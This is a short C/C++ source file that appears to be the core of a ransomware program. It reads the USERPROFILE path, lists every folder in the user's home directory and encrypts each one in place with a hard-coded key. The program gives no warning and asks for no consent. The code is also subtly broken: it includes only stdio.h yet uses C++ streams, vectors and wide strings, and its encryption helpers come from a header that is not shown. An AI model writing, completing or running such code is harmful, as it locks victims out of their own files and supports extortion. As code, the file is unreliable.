#include <stdio.h>
#include "encrypt.h"

int main() {
    // Get the user's home directory path
    const wchar_t* userProfileDir = _wgetenv(L"USERPROFILE");
    if (!userProfileDir) {
        std::cerr << "Failed to get user's home directory." << std::endl;
        return 1;
    }

    // Get all folder names within the user's home directory
    std::vector<std::wstring> folderNames = getFolderNames(userProfileDir);

    // Encrypt folders within each user's home directory
    for (const auto& folderName : folderNames) {
        // Construct the folder path
        std::wstring folderPath = userProfileDir;
        folderPath += L"\\" + folderName;

        // Example decryption key
        const BYTE decryptionKey[] = {0x01, 0x02, 0x03, 0x04};
        const DWORD keySize = sizeof(decryptionKey);

        if (encryptFolder(folderPath, decryptionKey, keySize)) {
            std::wcout << L"Folder '" << folderName << L"' encrypted successfully." << std::endl;
        } else {
            std::wcerr << L"Failed to encrypt folder '" << folderName << L"'." << std::endl;
        }
    }

    return 0;
}
